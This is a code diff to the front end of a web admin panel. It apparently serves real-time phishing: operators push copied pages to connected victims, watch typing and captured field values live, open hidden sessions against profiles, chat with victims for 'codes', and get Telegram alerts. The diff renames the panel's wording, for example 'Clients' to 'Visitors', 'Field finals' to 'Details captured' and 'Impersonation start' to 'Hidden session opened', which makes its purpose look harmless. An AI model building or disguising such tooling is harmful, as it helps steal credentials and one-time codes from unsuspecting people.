@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mini Admin — Telegram &amp; LPV</title>
+<title>Mini Admin — Visitors, Alerts &amp; Live pages</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap">
@@ -745,7 +745,7 @@ select.sel option{background:#12141c;color:#f3f5f9}
         </div>
         <div class="logo-text">Mini Admin</div>
       </div>
-      <div class="login-title">Sign in to reach your clients, Telegram and LPV</div>
+      <div class="login-title">Sign in to reach your visitors, alerts and live pages</div>
       <form id="loginForm" autocomplete="off">
         <div class="form-group">
           <label class="form-label" for="username">Username</label>
@@ -781,32 +781,32 @@ select.sel option{background:#12141c;color:#f3f5f9}
       <div class="mark">
         <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
       </div>
-      <div class="brand-txt"><b>Mini Admin</b><span>Telegram · LPV</span></div>
+      <div class="brand-txt"><b>Mini Admin</b><span>Alerts · Live pages</span></div>
     </div>
 
     <nav class="nav" id="nav">
       <div class="nav-label">Operate</div>
       <button class="nav-item on" data-view="clients">
         <svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
-        <span>Clients</span><em class="badge" id="badgeClients">0</em>
+        <span>Visitors</span><em class="badge" id="badgeClients">0</em>
       </button>
       <button class="nav-item" data-view="profiles">
         <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-        <span>Profiles</span><em class="badge" id="badgeProfiles">0</em>
+        <span>History</span><em class="badge" id="badgeProfiles">0</em>
       </button>
 
       <div class="nav-label">Configure</div>
       <button class="nav-item" data-view="chat">
         <svg viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8z"/></svg>
-        <span>Chat</span><em class="badge" id="badgeChat">0</em>
+        <span>Messages</span><em class="badge" id="badgeChat">0</em>
       </button>
       <button class="nav-item" data-view="telegram">
         <svg viewBox="0 0 24 24"><path d="M21.7 4.3 2.9 11.6c-1 .4-1 1.8 0 2.1l4.6 1.4 1.8 5.5c.3.9 1.5.9 1.8 0l2.5-3.9 4.6 3.4c.7.5 1.7.1 1.9-.8l3.2-13.4c.2-.9-.7-1.6-1.6-1.6z"/></svg>
-        <span>Telegram</span>
+        <span>Alerts</span>
       </button>
       <button class="nav-item" data-view="lpv">
         <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M8 13h8M8 17h5"/></svg>
-        <span>LPV Studio</span><em class="badge" id="badgePages">0</em>
+        <span>Live pages</span><em class="badge" id="badgePages">0</em>
       </button>
     </nav>
 
@@ -825,12 +825,12 @@ select.sel option{background:#12141c;color:#f3f5f9}
   <div class="main">
     <header class="topbar">
       <div style="min-width:0;overflow:hidden">
-        <h1 id="viewTitle" style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">Clients</h1>
-        <div class="sub" id="viewSub">Everyone connected to your panel right now</div>
+        <h1 id="viewTitle" style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">Visitors</h1>
+        <div class="sub" id="viewSub">People on your pages right now</div>
       </div>
       <div class="spacer"></div>
       <div class="metrics">
-        <div class="metric"><b id="mClients">0</b><span>Clients</span></div>
+        <div class="metric"><b id="mClients">0</b><span>Visitors</span></div>
         <div class="metric"><b id="mCpu">0%</b><span>CPU</span></div>
         <div class="metric"><b id="mMem">0%</b><span>RAM</span></div>
       </div>
@@ -850,23 +850,23 @@ select.sel option{background:#12141c;color:#f3f5f9}
 <nav class="tabbar" id="tabbar">
   <button class="tab on" data-view="clients">
     <svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
-    <span>Clients</span><em class="badge" id="tabBadgeClients">0</em>
+    <span>Visitors</span><em class="badge" id="tabBadgeClients">0</em>
   </button>
   <button class="tab" data-view="profiles">
     <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-    <span>Profiles</span><em class="badge" id="tabBadgeProfiles">0</em>
+    <span>History</span><em class="badge" id="tabBadgeProfiles">0</em>
   </button>
   <button class="tab" data-view="chat">
     <svg viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8z"/></svg>
-    <span>Chat</span><em class="badge" id="tabBadgeChat">0</em>
+    <span>Messages</span><em class="badge" id="tabBadgeChat">0</em>
   </button>
   <button class="tab" data-view="telegram">
     <svg viewBox="0 0 24 24"><path d="M21.7 4.3 2.9 11.6c-1 .4-1 1.8 0 2.1l4.6 1.4 1.8 5.5c.3.9 1.5.9 1.8 0l2.5-3.9 4.6 3.4c.7.5 1.7.1 1.9-.8l3.2-13.4c.2-.9-.7-1.6-1.6-1.6z"/></svg>
-    <span>Telegram</span>
+    <span>Alerts</span>
   </button>
   <button class="tab" data-view="lpv">
     <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M8 13h8M8 17h5"/></svg>
-    <span>LPV</span><em class="badge" id="tabBadgePages">0</em>
+    <span>Pages</span><em class="badge" id="tabBadgePages">0</em>
   </button>
 </nav>
 
@@ -878,7 +878,7 @@ select.sel option{background:#12141c;color:#f3f5f9}
   </button>
   <button class="sheet-item" id="sheetRefresh">
     <svg viewBox="0 0 24 24"><path d="M21 12a9 9 0 1 1-2.6-6.4"/><path d="M21 3v6h-6"/></svg>
-    Resync all data
+    Refresh everything
   </button>
   <button class="sheet-item danger" id="sheetLogout">
     <svg viewBox="0 0 24 24"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><path d="M16 17l5-5-5-5"/><path d="M21 12H9"/></svg>
@@ -892,7 +892,7 @@ select.sel option{background:#12141c;color:#f3f5f9}
     <span class="dr-grab"></span>
     <div class="avatar" id="drAvatar">–</div>
     <div style="min-width:0;flex:1">
-      <div class="dr-title" id="drTitle">Client</div>
+      <div class="dr-title" id="drTitle">Visitor</div>
       <div class="dr-sub" id="drSub">—</div>
     </div>
     <button class="icon-btn" id="drClose">
@@ -1039,6 +1039,37 @@ function toast(msg, kind='info'){
   el.innerHTML = `<div class="ic">${icons[kind]||icons.info}</div><div>${esc(msg)}</div>`;
   $('#toasts').appendChild(el);
   setTimeout(() => { el.classList.add('out'); setTimeout(()=>el.remove(), 300); }, 3600);
+}
+
+
+/* Server event names arrive in snake_case (field_final, page_load, submit).
+   Show operators plain English instead of the wire format. */
+const EVENT_LABELS = {
+  field_final:    'Detail captured',
+  field_change:   'Typing',
+  input:          'Typing',
+  page_load:      'Page viewed',
+  page_loaded:    'Page viewed',
+  page_pushed:    'Page sent',
+  page_final:     'Page finished',
+  submit:         'Form submitted',
+  click:          'Clicked',
+  push:           'Page sent',
+  load:           'Page viewed',
+  redirect:       'Sent to another page',
+  workflow_start: 'Flow started',
+  workflow_done:  'Flow finished',
+  chat:           'Message sent',
+  lpv_start:      'Live session started',
+  lpv_stop:       'Live session ended',
+};
+function eventLabel(t){
+  if(!t) return '';
+  if(EVENT_LABELS[t]) return EVENT_LABELS[t];
+  return String(t)
+    .replace(/_/g, ' ')
+    .replace(/([a-z])([A-Z])/g, '$1 $2')
+    .replace(/\b\w/g, c => c.toUpperCase());
 }
 
 /* ============================================================
@@ -1265,13 +1296,13 @@ function handleAdminMsg(m){
     }
     case 'lpv_ack': {
       const ok = m.delivered;
-      const names = {start:'LPV started', stop:'LPV stopped', push_page:'Page pushed'};
+      const names = {start:'Live session started', stop:'Live session ended', push_page:'Page sent'};
       toast(`${names[m.action] || m.action} — ${ok ? 'delivered' : 'client offline'}`, ok ? 'ok' : 'err');
       if(m.action === 'push_page' && ok) setTimeout(loadAudit, 600, S.selected);
       break;
     }
     case 'lpv_error':
-      toast(m.error || 'LPV error', 'err');
+      toast(m.error || 'Live page error', 'err');
       break;
     case 'lpv_event':
       pushFeed(m);
@@ -1386,11 +1417,11 @@ async function loadAudit(cid){
    Router
    ============================================================ */
 const VIEWS = {
-  clients:  {title:'Clients',  sub:'Everyone connected to your panel right now'},
-  profiles: {title:'Profiles', sub:'Recent clients and what they have been doing'},
-  telegram: {title:'Telegram', sub:'Bot credentials, destination and notification rules'},
-  chat:     {title:'Live chat', sub:'Talk to clients on their LPV pages — text, codes and instructions'},
-  lpv:      {title:'LPV Studio', sub:'Pages, workflows and LPV runtime behaviour'},
+  clients:  {title:'Visitors',   sub:'People on your pages right now'},
+  profiles: {title:'History',    sub:'What each visitor did, newest first'},
+  telegram: {title:'Alerts',     sub:'Send notifications to your phone or team'},
+  chat:     {title:'Messages',   sub:'Talk to visitors while they are on a page'},
+  lpv:      {title:'Live pages', sub:'Saved pages, automated flows and how new visitors start'},
 };
 function go(view){
   S.view = view;
@@ -1452,24 +1483,24 @@ function renderClients(){
   const box = $('#view');
   const list = S.clients;
   const cards = list.length ? list.map(c => clientCard(c)).join('') : emptyBlock(
-    'No clients connected',
-    'Open <code style="font-family:var(--mono);font-size:11px">/client.html</code> in a browser, or share a persistent link. They will appear here the moment they connect.',
+    'No visitors right now',
+    'Start a session from the main panel or share a link with someone. They appear here the moment they connect.',
     '<svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>'
   );
 
   box.innerHTML = `
     <div class="sec-head">
-      <h2>Connected</h2>
-      <span class="hint">${list.length} live${S.hidden ? ' · ' + S.hidden + ' hidden' : ''}</span>
+      <h2>Visitors online</h2>
+      <span class="hint">${list.length} online${S.hidden ? ' · ' + S.hidden + ' hidden' : ''}</span>
       <div class="line"></div>
-      <button class="btn sm" onclick="loadAll()">Resync</button>
+      <button class="btn sm" onclick="loadAll()">Refresh</button>
     </div>
     <div class="grid g-auto" id="clientGrid">${cards}</div>
 
     <div style="height:26px"></div>
     <div class="sec-head">
       <h2>Live activity</h2>
-      <span class="hint">streamed from every client</span>
+      <span class="hint">what every visitor is doing, as it happens</span>
       <div class="line"></div>
       <button class="btn sm ghost" onclick="S.feed=[];paintFeed()">Clear</button>
     </div>
@@ -1501,10 +1532,10 @@ function clientCard(c){
   const id = c.client_id || c.parent_client_id || 'unknown';
   const isLpv = !!c.is_lpv;
   const sleeping = !!c.is_sleeping;
-  const mode = isLpv ? 'LPV' : (c.mode || c.client_type || 'browser');
+  const mode = isLpv ? 'Live page' : (c.mode === 'browser' ? 'Remote browser' : (c.mode || c.client_type || 'Remote browser'));
   const avatarCls = isLpv ? 'lpv' : sleeping ? 'sleep' : '';
   const statusCls = sleeping ? 'a' : isLpv ? 'c' : 'g';
-  const statusTxt = sleeping ? 'Sleeping' : isLpv ? 'LPV live' : 'Streaming';
+  const statusTxt = sleeping ? 'Idle' : isLpv ? 'On a live page' : 'Browsing';
   const url = c.current_url && c.current_url !== '--' ? hostOf(c.current_url) : (c.title || 'no page');
   return `
   <div class="ccard ${S.selected===id?'sel':''}" data-id="${esc(id)}">
@@ -1519,14 +1550,14 @@ function clientCard(c){
     <div class="cc-url" title="${esc(c.current_url||'')}">${esc(url)}</div>
     <div class="cc-stats">
       <div class="cc-stat"><b>${Math.round(c.fps ?? c.streamer_fps ?? 0)}</b><span>FPS</span></div>
-      <div class="cc-stat"><b>${fmtDur(c.uptime)}</b><span>Up</span></div>
-      <div class="cc-stat"><b>${esc(c.location && c.location.country ? c.location.country : (c.device_id ? 'dev' : '—'))}</b><span>Geo</span></div>
+      <div class="cc-stat"><b>${fmtDur(c.uptime)}</b><span>Online for</span></div>
+      <div class="cc-stat"><b>${esc(c.location && c.location.country ? c.location.country : (c.device_id ? 'dev' : '—'))}</b><span>Location</span></div>
     </div>
     <div class="cc-acts">
-      <button class="btn sm primary" data-act="push" data-id="${esc(id)}">
-        <svg viewBox="0 0 24 24"><path d="M12 19V5M5 12l7-7 7 7"/></svg>Page
+      <button class="btn sm primary" data-act="push" data-id="${esc(id)}" title="Send this visitor a page">
+        <svg viewBox="0 0 24 24"><path d="M12 19V5M5 12l7-7 7 7"/></svg>Send
       </button>
-      <button class="btn sm" data-act="wf" data-id="${esc(id)}">
+      <button class="btn sm" data-act="wf" data-id="${esc(id)}" title="Start an automated flow for this visitor">
         <svg viewBox="0 0 24 24"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg>Flow
       </button>
       <button class="btn sm ghost" data-act="open" data-id="${esc(id)}">
@@ -1545,14 +1576,14 @@ function paintFeed(){
   const el = $('#feed'); if(!el) return;
   if(!S.feed.length){
     el.innerHTML = `<div style="text-align:center;padding:26px;color:var(--txt-3);font-size:12.5px">
-      Waiting for events — page views, field entries and submissions will stream in here.</div>`;
+      Waiting for activity — page views, typing and form submissions appear here as they happen.</div>`;
     return;
   }
   const tone = t => t.includes('final') ? 'a' : t.includes('submit') ? 'g' : t.includes('push') || t.includes('load') ? 'c' : '';
   el.innerHTML = S.feed.map(e => `
     <div class="feed-item">
       <span class="t">${esc(clockTime(e.t))}</span>
-      <span class="chip ${tone(e.event_type)}">${esc(e.event_type)}</span>
+      <span class="chip ${tone(e.event_type)}">${esc(eventLabel(e.event_type))}</span>
       <span class="chip m">${esc(shortId(e.client_id,8))}</span>
       <span class="pg">${esc(e.page_name || '')}</span>
       ${e.value ? `<span class="vl" title="${esc(e.value)}">${esc(e.value)}</span>` : ''}
@@ -1585,31 +1616,31 @@ function renderProfiles(){
   const liveCount = all.filter(p => p.is_active).length;
 
   const cards = list.length ? list.map(p => profileCard(p, maxEvents)).join('') : emptyBlock(
-    S.q ? 'No match' : 'No profiles yet',
-    S.q ? 'Nothing matches “' + esc(S.q) + '”.' : 'Clients show up here once they have received an LPV page or triggered an event.',
+    S.q ? 'No match' : 'No history yet',
+    S.q ? 'Nothing matches “' + esc(S.q) + '”.' : 'Visitors appear here once they have been sent a page or done something on one.',
     '<svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>'
   );
 
   box.innerHTML = `
     <div class="grid g4" style="margin-bottom:22px">
-      ${statCard('Profiles', all.length, 'v')}
-      ${statCard('Live now', liveCount, 'g')}
-      ${statCard('Events', totalEvents, 'c')}
-      ${statCard('Field finals', totalFinals, 'a')}
+      ${statCard('Visitors seen', all.length, 'v')}
+      ${statCard('Here now', liveCount, 'g')}
+      ${statCard('Actions', totalEvents, 'c')}
+      ${statCard('Details captured', totalFinals, 'a')}
     </div>
 
     <div class="sec-head">
-      <h2>Recent clients</h2>
+      <h2>Recent visitors</h2>
       <div class="line"></div>
       <div class="profbar">
         <div class="search">
           <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
-          <input id="pSearch" placeholder="Search client id or page…" value="${esc(S.q)}">
+          <input id="pSearch" placeholder="Search visitor or page…" value="${esc(S.q)}">
         </div>
         <select class="sel" id="pSort" style="width:auto">
           <option value="recent" ${S.sort==='recent'?'selected':''}>Most recent</option>
-          <option value="events" ${S.sort==='events'?'selected':''}>Most events</option>
-          <option value="finals" ${S.sort==='finals'?'selected':''}>Most finals</option>
+          <option value="events" ${S.sort==='events'?'selected':''}>Most activity</option>
+          <option value="finals" ${S.sort==='finals'?'selected':''}>Most details captured</option>
         </select>
       </div>
     </div>
@@ -1617,7 +1648,7 @@ function renderProfiles(){
     <div class="chips-scroll">
       ${filterChip('all','All',list.length)}
       ${filterChip('live','Live only',all.filter(p=>p.is_active).length)}
-      ${filterChip('finals','Has finals',all.filter(p=>(p.field_final_count||0)>0).length)}
+      ${filterChip('finals','Has details',all.filter(p=>(p.field_final_count||0)>0).length)}
     </div>
 
     <div class="grid g-auto" id="profGrid">${cards}</div>
@@ -1672,9 +1703,9 @@ function profileCard(p, maxEvents){
       </div>
     </div>
     <div class="p-stats">
-      <div class="p-stat"><b>${p.event_count||0}</b><span>Events</span></div>
+      <div class="p-stat"><b>${p.event_count||0}</b><span>Actions</span></div>
       <div class="p-stat"><b>${p.page_count||0}</b><span>Pages</span></div>
-      <div class="p-stat"><b>${p.field_final_count||0}</b><span>Finals</span></div>
+      <div class="p-stat"><b>${p.field_final_count||0}</b><span>Details</span></div>
     </div>
     <div class="p-bar"><i style="width:${pct}%"></i></div>
     ${p.last_page_name ? `<div class="p-page">
@@ -1703,7 +1734,7 @@ function onChatMessage(m){
     }
   }
   loadChatThreads();
-  if(S.view !== 'chat') toast('New chat message from ' + shortId(m.client_id, 8), 'info');
+  if(S.view !== 'chat') toast('New message from ' + shortId(m.client_id, 8), 'info');
 }
 
 function renderChat(){
@@ -1717,7 +1748,7 @@ function renderChat(){
     <div class="card" style="margin-bottom:16px">
       <div class="sec-head">
         <h2>Live chat</h2>
-        <span class="hint">pulsing bubble on every LPV page</span>
+        <span class="hint">pulsing bubble on every live page</span>
         <div class="line"></div>
         <button class="btn sm ghost" id="chatTgl">${S.chat.showSettings ? 'Hide settings' : 'Settings'}</button>
       </div>
@@ -1728,7 +1759,7 @@ function renderChat(){
             <input type="checkbox" id="chEnabled" ${st.chat_enabled ? 'checked' : ''}>
             <span class="track"></span><span class="tg-txt">Live chat enabled</span>
           </label>
-          <div class="desc">Clients see a pulsing bubble on their LPV page. Switching off hides it instantly everywhere.</div>
+          <div class="desc">Visitors see a pulsing bubble on the page. Turning this off hides it everywhere at once.</div>
         </div>
       </div>
 
@@ -1822,7 +1853,7 @@ function renderChat(){
         <div style="margin:auto;text-align:center;padding:40px 24px;color:var(--txt-3)">
           <svg viewBox="0 0 24 24" style="width:34px;height:34px;stroke:var(--txt-3);fill:none;stroke-width:1.4;margin:0 auto 12px;stroke-linecap:round;stroke-linejoin:round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8z"/></svg>
           <b style="display:block;font-size:13.5px;color:var(--txt-2);margin-bottom:5px;font-weight:600">Pick a conversation</b>
-          <div style="font-size:12.5px">${threads.length ? 'Choose a client on the left to read and reply.' : 'No one has messaged yet. Enable live chat and push an LPV page — the bubble appears automatically.'}</div>
+          <div style="font-size:12.5px">${threads.length ? 'Choose a visitor on the left to read and reply.' : 'No messages yet. Turn on live chat and send a page — the bubble appears on its own.'}</div>
         </div>`}
       </div>
     </div>
@@ -2013,19 +2044,19 @@ async function doChatSend(){
 }
 
 /* ============================================================
-   VIEW — Telegram
+   VIEW — Alerts
    ============================================================ */
 
 const TG_TOGGLES = [
-  ['notify_connect',      'Client connected',      'Fires whenever a browser session or LPV client comes online.'],
-  ['notify_disconnect',   'Client disconnected',   'Fires when a session closes or times out.'],
-  ['notify_navigate',     'Navigation',            'Client moved to a different URL. Can be chatty.'],
-  ['notify_impersonate',  'Impersonation start',   'Admin opened a hidden session against a profile.'],
-  ['notify_lpv_push',     'Page pushed',           'Operator pushed an LPV page to a client.'],
-  ['notify_lpv_workflow', 'Workflow started',      'A workflow chain began on a client.'],
-  ['notify_lpv_final',    'Final values',          'Aggregated field values once a page is left.'],
-  ['notify_lpv_submit',   'Form submitted',        'Client submitted a form on a pushed page.'],
-  ['notify_lpv_security', 'Security alerts',       'Invalid link, replayed token, suspicious access.'],
+  ['notify_connect',      'Visitor connected',     'Someone comes online — a remote browser session or a live page.'],
+  ['notify_disconnect',   'Visitor disconnected',  'A session closes or times out.'],
+  ['notify_navigate',     'Page change',           'A visitor moves to a different address. Can be chatty.'],
+  ['notify_impersonate',  'Hidden session opened', 'An operator opened a hidden session against a visitor.'],
+  ['notify_lpv_push',     'Page sent',             'An operator sent a page to a visitor.'],
+  ['notify_lpv_workflow', 'Flow started',          'An automated sequence began for a visitor.'],
+  ['notify_lpv_final',    'Details captured',      'Collected form values once the visitor leaves the page.'],
+  ['notify_lpv_submit',   'Form submitted',        'A visitor submitted a form on a page you sent.'],
+  ['notify_lpv_security', 'Security alerts',       'Invalid link, replayed token, or suspicious access.'],
 ];
 function renderTelegram(){
   const t = S.tg || {};
@@ -2036,7 +2067,7 @@ function renderTelegram(){
 
       <div class="card">
         <div class="sec-head">
-          <h2>Credentials</h2>
+          <h2>Connection</h2>
           <div class="line"></div>
           <span class="chip ${has?'g':'r'}">${has?'Configured':'Missing'}</span>
         </div>
@@ -2054,7 +2085,7 @@ function renderTelegram(){
           <div>
             <label class="tg">
               <input type="checkbox" id="tgEnabled" ${t.enabled!==false?'checked':''}>
-              <span class="track"></span><span class="tg-txt">Bot enabled</span>
+              <span class="track"></span><span class="tg-txt">Send alerts</span>
             </label>
             <div class="desc">Master switch. When off, the server keeps the credentials but sends nothing.</div>
           </div>
@@ -2078,7 +2109,7 @@ function renderTelegram(){
       </div>
 
       <div class="card">
-        <div class="sec-head"><h2>Broadcast</h2><div class="line"></div></div>
+        <div class="sec-head"><h2>Send a message</h2><div class="line"></div></div>
         <div style="margin-bottom:12px">
           <label class="field-lab">Message</label>
           <textarea class="inp" id="tgMsg" rows="5" placeholder="Type an update for your ops channel…" style="resize:vertical;font-family:inherit"></textarea>
@@ -2100,11 +2131,11 @@ function renderTelegram(){
 
     <div class="card">
       <div class="sec-head">
-        <h2>Notifications</h2>
+        <h2>Notify me when</h2>
         <span class="hint">pick exactly what should hit your phone</span>
         <div class="line"></div>
-        <button class="btn sm ghost" id="tgAll">All on</button>
-        <button class="btn sm ghost" id="tgNone">All off</button>
+        <button class="btn sm ghost" id="tgAll">Select all</button>
+        <button class="btn sm ghost" id="tgNone">Clear all</button>
       </div>
       <div class="grid g2">
         ${TG_TOGGLES.map(([k,label,desc]) => `
@@ -2119,7 +2150,7 @@ function renderTelegram(){
           </div>`).join('')}
       </div>
       <div style="margin-top:18px">
-        <button class="btn primary" id="tgSave2">Save notifications</button>
+        <button class="btn primary" id="tgSave2">Save alert settings</button>
       </div>
     </div>
   `;
@@ -2138,7 +2169,7 @@ function renderTelegram(){
     try {
       await post('/api/admin/config/telegram', cfg);
       S.tg = Object.assign({}, S.tg, cfg);
-      toast('Telegram settings saved', 'ok');
+      toast('Alert settings saved', 'ok');
       loadTelegram();
     } catch(e){ toast('Save failed: ' + e.message, 'err'); }
   });
@@ -2175,7 +2206,7 @@ function tgHealthRow(label, ok){
 }
 
 /* ============================================================
-   VIEW — LPV Studio
+   VIEW — Live pages
    ============================================================ */
 function renderLPV(){
   const box = $('#view');
@@ -2185,51 +2216,51 @@ function renderLPV(){
 
   box.innerHTML = `
     <div class="card" style="margin-bottom:22px">
-      <div class="sec-head"><h2>Runtime</h2><span class="hint">applies immediately, no restart</span><div class="line"></div></div>
+      <div class="sec-head"><h2>How new visitors start</h2><span class="hint">applies immediately, no restart</span><div class="line"></div></div>
       <div class="grid g3">
         <div class="tg-row">
           <div>
             <label class="tg">
               <input type="checkbox" id="stLpvOnly" ${st.lpv_only_mode?'checked':''}>
-              <span class="track"></span><span class="tg-txt">LPV-only mode</span>
+              <span class="track"></span><span class="tg-txt">Live pages only</span>
             </label>
-            <div class="desc">New clients boot straight into LPV — no browser is created for them.</div>
+            <div class="desc">New visitors go straight to a live page — no remote browser is opened for them.</div>
           </div>
         </div>
         <div>
-          <label class="field-lab">Default landing page</label>
+          <label class="field-lab">Default page</label>
           <input class="inp" id="stDefault" value="${esc(st.lpv_default_page||'')}" placeholder="_default.html">
-          <div style="font-size:10.5px;color:var(--txt-3);margin-top:6px">File inside the LPV pages directory.</div>
+          <div style="font-size:10.5px;color:var(--txt-3);margin-top:6px">File name inside the pages folder.</div>
         </div>
         <div>
-          <label class="field-lab">Auto-workflow</label>
+          <label class="field-lab">Flow to run automatically</label>
           <select class="sel" id="stAutoWf">
             <option value="">— none —</option>
             ${wfs.map(w => `<option value="${esc(w.id)}" ${st.auto_workflow_id===w.id?'selected':''}>${esc(w.name)}</option>`).join('')}
           </select>
-          <div style="font-size:10.5px;color:var(--txt-3);margin-top:6px">Plays for every client that connects in LPV-only mode.</div>
+          <div style="font-size:10.5px;color:var(--txt-3);margin-top:6px">Runs for every visitor while “Live pages only” is on.</div>
         </div>
       </div>
-      <div style="margin-top:16px"><button class="btn primary" id="stSave">Save runtime settings</button></div>
+      <div style="margin-top:16px"><button class="btn primary" id="stSave">Save settings</button></div>
     </div>
 
     <div class="sec-head">
-      <h2>Pages</h2><span class="hint">${pages.length} archived</span><div class="line"></div>
-      <button class="btn sm" onclick="loadPages()">Reload</button>
+      <h2>Saved pages</h2><span class="hint">${pages.length} saved</span><div class="line"></div>
+      <button class="btn sm" onclick="loadPages()">Refresh</button>
     </div>
     <div class="grid g-page" style="margin-bottom:26px">
-      ${pages.length ? pages.map(pageCard).join('') : emptyBlock('Archive is empty',
-        'Capture pages with the PCM browser in the main admin panel, or upload them via the LPV archive API.',
+      ${pages.length ? pages.map(pageCard).join('') : emptyBlock('No saved pages',
+        'Save pages from the main panel, or upload them through the API.',
         '<svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/></svg>')}
     </div>
 
     <div class="sec-head">
-      <h2>Workflows</h2><span class="hint">${wfs.length} defined</span><div class="line"></div>
-      <button class="btn sm" onclick="loadWorkflows()">Reload</button>
+      <h2>Automated flows</h2><span class="hint">${wfs.length} set up</span><div class="line"></div>
+      <button class="btn sm" onclick="loadWorkflows()">Refresh</button>
     </div>
     <div class="grid g-auto">
-      ${wfs.length ? wfs.map(wfCard).join('') : emptyBlock('No workflows',
-        'Build a chain of pages and redirects in the main admin panel to see it here.',
+      ${wfs.length ? wfs.map(wfCard).join('') : emptyBlock('No flows yet',
+        'Build a sequence of pages and redirects in the main panel to see it here.',
         '<svg viewBox="0 0 24 24"><path d="M13 2 3 14h9l-1 8 10-12h-9z"/></svg>')}
     </div>
   `;
@@ -2241,7 +2272,7 @@ function renderLPV(){
         lpv_default_page: $('#stDefault').value.trim(),
         auto_workflow_id: $('#stAutoWf').value,
       });
-      toast('Runtime settings applied', 'ok');
+      toast('Settings saved', 'ok');
       loadSettings();
     } catch(e){ toast('Save failed: ' + e.message, 'err'); }
   });
@@ -2252,7 +2283,7 @@ function renderLPV(){
       const r = await post('/api/lpv/workflows/' + encodeURIComponent(b.dataset.wfLink) + '/link', {});
       const link = r.link || '';
       try { await navigator.clipboard.writeText(link); toast('Share link copied', 'ok'); }
-      catch(e){ prompt('Workflow link', link); }
+      catch(e){ prompt('Flow link', link); }
     } catch(e){ toast('Link failed: ' + e.message, 'err'); }
   }));
 }
@@ -2342,7 +2373,7 @@ function openDrawer(cid, opts={}){
 }
 
 /* Re-pull just the volatile parts of an open drawer. Re-rendering the whole
-   body would blow away the operator's page/workflow selections. */
+   body would blow away the operator's page/flow selections. */
 function refreshDrawer(cid){
   const c = S.clients.find(x => x.client_id === cid);
   if(c){
@@ -2354,11 +2385,11 @@ function refreshDrawer(cid){
 }
 
 function currentPageOf(c){
-  if(!c) return 'offline — no live session';
+  if(!c) return 'Offline — no live session';
   const url = c.current_url && c.current_url !== '--' ? c.current_url : '';
   if(url) return url;
   if(c.title) return c.title;
-  return c.is_lpv ? 'LPV page (no URL reported)' : 'no page reported';
+  return c.is_lpv ? 'Live page (no address reported)' : 'No page reported yet';
 }
 function drawerBody(cid, c, p, opts){
   const pages = S.pages || [];
@@ -2369,8 +2400,8 @@ function drawerBody(cid, c, p, opts){
       <label class="field-lab">Status</label>
       <div style="display:flex;gap:6px;flex-wrap:wrap" id="drMeta">
         ${c
-          ? `<span class="chip ${isLpv?'c':'g'}">${isLpv?'LPV':'Browser'}</span>
-             <span class="chip ${c.is_sleeping?'a':'g'}">${c.is_sleeping?'Sleeping':'Active'}</span>
